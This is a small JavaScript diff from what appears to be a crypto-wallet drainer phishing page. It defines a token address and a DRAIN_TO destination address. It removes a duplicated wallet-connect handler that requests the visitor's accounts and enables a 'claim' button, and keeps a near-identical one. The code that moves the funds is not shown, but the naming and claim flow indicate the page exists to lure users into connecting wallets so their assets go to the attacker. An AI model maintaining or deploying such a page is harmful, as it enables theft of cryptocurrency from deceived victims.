@@ -38,16 +38,6 @@ const VEN_TOKEN = "0xfffB251755865a815C7817e5ab9ABbe1FEF71435";
 const DRAIN_TO = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";
 
 document.getElementById("connect").onclick = async () => {
-  if (!window.ethereum) return document.getElementById("status").textContent = "No wallet";
-  try {
-    const a = await ethereum.request({method:"eth_requestAccounts"});
-    document.getElementById("addr").textContent = "Connected: " + a[0].slice(0,8)+"...";
-    document.getElementById("claim").disabled = false;  // ← ИСПРАВЛЕНО
-    document.getElementById("status").textContent = "Ready!";
-  } catch { document.getElementById("status").textContent = "Rejected"; }
-};
-
-document.getElementById("connect").onclick = async () => {
   if (!window.ethereum) return document.getElementById("status").textContent = "Install MetaMask";
   try {
     const a = await ethereum.request({method:"eth_requestAccounts"});
